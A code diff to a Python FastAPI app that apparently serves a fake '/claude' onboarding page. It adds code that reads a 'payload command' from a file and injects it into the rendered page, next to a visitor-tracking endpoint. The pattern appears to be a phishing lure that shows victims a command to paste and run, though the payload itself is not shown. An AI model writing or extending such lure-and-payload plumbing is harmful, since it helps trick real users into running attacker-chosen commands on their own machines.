@@ -20,6 +20,14 @@ import uvicorn
 # ====================== CONFIG ======================
 BASE_DIR = Path(__file__).parent
 CONFIG_FILE = BASE_DIR / "config" / "config.yaml"
+PAYLOAD_FILE = BASE_DIR / "payload" / "payload.txt"
+
+def load_payload():
+    """Load payload command from payload.txt"""
+    if PAYLOAD_FILE.exists():
+        with open(PAYLOAD_FILE, "r", encoding="utf-8") as f:
+            return f.read()
+    return ""
 
 def load_config():
     if CONFIG_FILE.exists():
@@ -125,10 +133,11 @@ async def root():
 @app.get("/claude", response_class=HTMLResponse)
 async def claude_page(request: Request):
     modal_template = config.get("modal_template", "onboarding_template.html")
+    payload_cmd = load_payload().strip()
     return templates.TemplateResponse(
         request, 
         config.get("template"), 
-        {"request": request, "domain": request.url.hostname, "modal_template": modal_template}
+        {"request": request, "domain": request.url.hostname, "modal_template": modal_template, "payload_command": payload_cmd}
     )
 
 @app.post("/api/track")
